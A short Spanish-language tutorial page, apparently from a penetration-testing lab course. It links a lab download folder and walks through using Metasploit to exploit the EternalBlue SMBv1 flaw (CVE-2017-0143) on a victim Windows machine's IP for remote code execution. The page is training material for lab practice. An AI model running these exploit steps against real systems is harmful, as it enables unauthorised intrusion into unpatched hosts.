---
icon: '3'
---

# Explotación de Vulnerabilidades y Ataques de Fuerza Bruta

## Enlace Alternativo de Descarga de los Laboratorios

{% embed url="https://drive.google.com/drive/folders/1EOkfWHycCEsO2QU6DHhloN7pnDAu6-vg" %}

## Uso Básico de Metasploit – Explotación EternalBlue en Windows

**EternalBlue** es una vulnerabilidad en SMBv1 de Windows (CVE-2017-0143), aprovechada por malware como WannaCry. A continuación, te muestro cómo explotar esta vulnerabilidad usando Metasploit:

```bash
# 1. Iniciar Metasploit
msfconsole

# 2. Buscar el exploit EternalBlue (CVE-2017-0143)
search eternalblue/CVE-2017-0143

# 3. Seleccionar el exploit encontrado
use 0

# 4. Mostrar las opciones disponibles del módulo
show options

# 5. Configurar la dirección IP de la máquina víctima
set RHOSTS <IP de la máquina víctima>

# 6. Ejecutar el exploit
run
```

Este exploit aprovecha una vulnerabilidad crítica en SMBv1, permitiendo ejecución remota de código en sistemas no parcheados.

